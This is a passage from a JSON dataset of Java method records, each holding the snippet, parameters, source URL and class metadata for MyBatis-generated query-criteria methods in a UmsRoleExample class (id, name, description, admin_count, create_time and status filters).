"Criteria", "snippet": "        public Criteria andIdNotIn(List<Long> values) {            addCriterion(\"id not in\", values, \"id\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andIdBetween", "params": ["Long", "Long"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdBetween(Long value1, Long value2) {            addCriterion(\"id between\", value1, value2, \"id\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andIdNotBetween", "params": ["Long", "Long"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdNotBetween(Long value1, Long value2) {            addCriterion(\"id not between\", value1, value2, \"id\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andNameIsNull", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andNameIsNull() {            addCriterion(\"name is null\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andNameIsNotNull", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andNameIsNotNull() {            addCriterion(\"name is not null\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andNameEqualTo", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andNameEqualTo(String value) {            addCriterion(\"name =\", value, \"name\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andNameNotEqualTo", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andNameNotEqualTo(String value) {            addCriterion(\"name <>\", value, \"name\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andNameGreaterThan", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andNameGreaterThan(String value) {            addCriterion(\"name >\", value, \"name\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andNameGreaterThanOrEqualTo", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andNameGreaterThanOrEqualTo(String value) {            addCriterion(\"name >=\", value, \"name\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andNameLessThan", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andNameLessThan(String value) {            addCriterion(\"name <\", value, \"name\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andNameLessThanOrEqualTo", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andNameLessThanOrEqualTo(String value) {            addCriterion(\"name <=\", value, \"name\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andNameLike", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andNameLike(String value) {            addCriterion(\"name like\", value, \"name\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andNameNotLike", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andNameNotLike(String value) {            addCriterion(\"name not like\", value, \"name\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andNameIn", "params": ["List<String>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andNameIn(List<String> values) {            addCriterion(\"name in\", values, \"name\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andNameNotIn", "params": ["List<String>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andNameNotIn(List<String> values) {            addCriterion(\"name not in\", values, \"name\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andNameBetween", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andNameBetween(String value1, String value2) {            addCriterion(\"name between\", value1, value2, \"name\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andNameNotBetween", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andNameNotBetween(String value1, String value2) {            addCriterion(\"name not between\", value1, value2, \"name\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andDescriptionIsNull", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andDescriptionIsNull() {            addCriterion(\"description is null\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andDescriptionIsNotNull", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andDescriptionIsNotNull() {            addCriterion(\"description is not null\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andDescriptionEqualTo", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andDescriptionEqualTo(String value) {            addCriterion(\"description =\", value, \"description\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andDescriptionNotEqualTo", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andDescriptionNotEqualTo(String value) {            addCriterion(\"description <>\", value, \"description\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andDescriptionGreaterThan", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andDescriptionGreaterThan(String value) {            addCriterion(\"description >\", value, \"description\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andDescriptionGreaterThanOrEqualTo", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andDescriptionGreaterThanOrEqualTo(String value) {            addCriterion(\"description >=\", value, \"description\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andDescriptionLessThan", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andDescriptionLessThan(String value) {            addCriterion(\"description <\", value, \"description\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andDescriptionLessThanOrEqualTo", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andDescriptionLessThanOrEqualTo(String value) {            addCriterion(\"description <=\", value, \"description\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andDescriptionLike", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andDescriptionLike(String value) {            addCriterion(\"description like\", value, \"description\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andDescriptionNotLike", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andDescriptionNotLike(String value) {            addCriterion(\"description not like\", value, \"description\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andDescriptionIn", "params": ["List<String>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andDescriptionIn(List<String> values) {            addCriterion(\"description in\", values, \"description\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andDescriptionNotIn", "params": ["List<String>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andDescriptionNotIn(List<String> values) {            addCriterion(\"description not in\", values, \"description\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andDescriptionBetween", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andDescriptionBetween(String value1, String value2) {            addCriterion(\"description between\", value1, value2, \"description\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andDescriptionNotBetween", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andDescriptionNotBetween(String value1, String value2) {            addCriterion(\"description not between\", value1, value2, \"description\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andAdminCountIsNull", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andAdminCountIsNull() {            addCriterion(\"admin_count is null\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andAdminCountIsNotNull", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andAdminCountIsNotNull() {            addCriterion(\"admin_count is not null\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andAdminCountEqualTo", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andAdminCountEqualTo(Integer value) {            addCriterion(\"admin_count =\", value, \"adminCount\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andAdminCountNotEqualTo", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andAdminCountNotEqualTo(Integer value) {            addCriterion(\"admin_count <>\", value, \"adminCount\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andAdminCountGreaterThan", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andAdminCountGreaterThan(Integer value) {            addCriterion(\"admin_count >\", value, \"adminCount\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andAdminCountGreaterThanOrEqualTo", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andAdminCountGreaterThanOrEqualTo(Integer value) {            addCriterion(\"admin_count >=\", value, \"adminCount\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andAdminCountLessThan", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andAdminCountLessThan(Integer value) {            addCriterion(\"admin_count <\", value, \"adminCount\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andAdminCountLessThanOrEqualTo", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andAdminCountLessThanOrEqualTo(Integer value) {            addCriterion(\"admin_count <=\", value, \"adminCount\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andAdminCountIn", "params": ["List<Integer>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andAdminCountIn(List<Integer> values) {            addCriterion(\"admin_count in\", values, \"adminCount\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andAdminCountNotIn", "params": ["List<Integer>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andAdminCountNotIn(List<Integer> values) {            addCriterion(\"admin_count not in\", values, \"adminCount\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andAdminCountBetween", "params": ["Integer", "Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andAdminCountBetween(Integer value1, Integer value2) {            addCriterion(\"admin_count between\", value1, value2, \"adminCount\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andAdminCountNotBetween", "params": ["Integer", "Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andAdminCountNotBetween(Integer value1, Integer value2) {            addCriterion(\"admin_count not between\", value1, value2, \"adminCount\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andCreateTimeIsNull", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andCreateTimeIsNull() {            addCriterion(\"create_time is null\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andCreateTimeIsNotNull", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andCreateTimeIsNotNull() {            addCriterion(\"create_time is not null\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andCreateTimeEqualTo", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andCreateTimeEqualTo(Date value) {            addCriterion(\"create_time =\", value, \"createTime\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andCreateTimeNotEqualTo", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andCreateTimeNotEqualTo(Date value) {            addCriterion(\"create_time <>\", value, \"createTime\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andCreateTimeGreaterThan", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andCreateTimeGreaterThan(Date value) {            addCriterion(\"create_time >\", value, \"createTime\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andCreateTimeGreaterThanOrEqualTo", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andCreateTimeGreaterThanOrEqualTo(Date value) {            addCriterion(\"create_time >=\", value, \"createTime\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andCreateTimeLessThan", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andCreateTimeLessThan(Date value) {            addCriterion(\"create_time <\", value, \"createTime\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andCreateTimeLessThanOrEqualTo", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andCreateTimeLessThanOrEqualTo(Date value) {            addCriterion(\"create_time <=\", value, \"createTime\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andCreateTimeIn", "params": ["List<Date>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andCreateTimeIn(List<Date> values) {            addCriterion(\"create_time in\", values, \"createTime\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andCreateTimeNotIn", "params": ["List<Date>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andCreateTimeNotIn(List<Date> values) {            addCriterion(\"create_time not in\", values, \"createTime\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andCreateTimeBetween", "params": ["Date", "Date"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andCreateTimeBetween(Date value1, Date value2) {            addCriterion(\"create_time between\", value1, value2, \"createTime\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andCreateTimeNotBetween", "params": ["Date", "Date"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andCreateTimeNotBetween(Date value1, Date value2) {            addCriterion(\"create_time not between\", value1, value2, \"createTime\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andStatusIsNull", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andStatusIsNull() {            addCriterion(\"status is null\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andStatusIsNotNull", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andStatusIsNotNull() {            addCriterion(\"status is not null\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andStatusEqualTo", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andStatusEqualTo(Integer value) {            addCriterion(\"status =\", value, \"status\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andStatusNotEqualTo", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andStatusNotEqualTo(Integer value) {            addCriterion(\"status <>\", value, \"status\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andStatusGreaterThan", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andStatusGreaterThan(Integer value) {            addCriterion(\"status >\", value, \"status\");            return (Criteria) this;        }", "url": 